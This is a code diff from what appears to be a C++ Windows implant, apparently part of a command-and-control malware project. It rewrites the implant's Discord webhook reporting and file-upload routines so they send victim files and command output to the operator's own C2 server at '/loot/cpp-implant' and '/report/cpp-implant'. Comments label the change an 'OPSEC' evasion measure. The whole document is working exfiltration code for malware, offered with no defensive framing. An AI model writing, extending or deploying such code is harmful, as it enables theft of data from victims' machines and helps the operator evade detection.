@@ -74,62 +74,56 @@ std::string http_get(const std::string& path) {
     return winhttp_request(L"GET", C2_HOST, C2_PORT, to_wide(path), "", false);
 }
 
-// ===================== Discord Webhook =====================
+// ===================== Webhook Proxy (OPSEC: via C2 only) =====================
 
 bool discord_send(const std::string& text_content) {
-    std::string body = "{\"content\":\"" + json_escape(text_content) + "\"}";
-    std::string resp = winhttp_request(L"POST", DISCORD_HOST, 443,
-                                        DISCORD_PATH, body, true);
-    return !resp.empty() || true; // Discord returns empty on success (204 No Content)
+    // OPSEC: Route through C2 webhook proxy instead of contacting Discord directly
+    // C2 server will forward to Discord on our behalf
+    std::string body = "{\"cmd_id\":\"cpp\",\"output\":\"" + json_escape(text_content) + "\",\"command\":\"implant_report\"}";
+    std::string resp = http_post_json("/report/cpp-implant", body);
+    return true;
 }
 
 bool discord_upload_file(const std::string& filepath, const std::string& message) {
-    // Read file
+    // OPSEC: Upload to C2 /loot/ endpoint which proxies to Discord
     std::ifstream file(filepath, std::ios::binary);
     if (!file.is_open()) return false;
     std::vector<char> file_data((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
     file.close();
     
-    // Extract filename
     std::string filename = filepath;
     size_t pos = filename.find_last_of("\\/");
     if (pos != std::string::npos) filename = filename.substr(pos + 1);
     
-    // Build multipart/form-data
+    // Build multipart/form-data for C2
     std::string boundary = "----FsocietyBoundary9876543210";
     std::string body;
     
-    // JSON payload_json part (message content)
+    // Message part
     body += "--" + boundary + "\r\n";
-    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
-    body += "Content-Type: application/json\r\n\r\n";
-    body += "{\"content\":\"" + json_escape(message) + "\"}\r\n";
+    body += "Content-Disposition: form-data; name=\"message\"\r\n\r\n";
+    body += message + "\r\n";
     
     // File part
     body += "--" + boundary + "\r\n";
-    body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n";
+    body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n";
     body += "Content-Type: application/octet-stream\r\n\r\n";
     body.append(file_data.begin(), file_data.end());
     body += "\r\n--" + boundary + "--\r\n";
     
-    // Send with multipart content type
+    // Send to C2 (not Discord)
     init_session();
     if (!g_session) return false;
     
-    HINTERNET hConnect = WinHttpConnect(g_session, DISCORD_HOST, 443, 0);
+    HINTERNET hConnect = WinHttpConnect(g_session, C2_HOST, C2_PORT, 0);
     if (!hConnect) return false;
     
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", DISCORD_PATH,
+    std::wstring loot_path = to_wide("/loot/cpp-implant");
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", loot_path.c_str(),
                                             nullptr, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            WINHTTP_FLAG_SECURE);
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) { WinHttpCloseHandle(hConnect); return false; }
-    
-    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
     
     std::wstring content_type = L"Content-Type: multipart/form-data; boundary=" + to_wide(boundary) + L"\r\n";
     
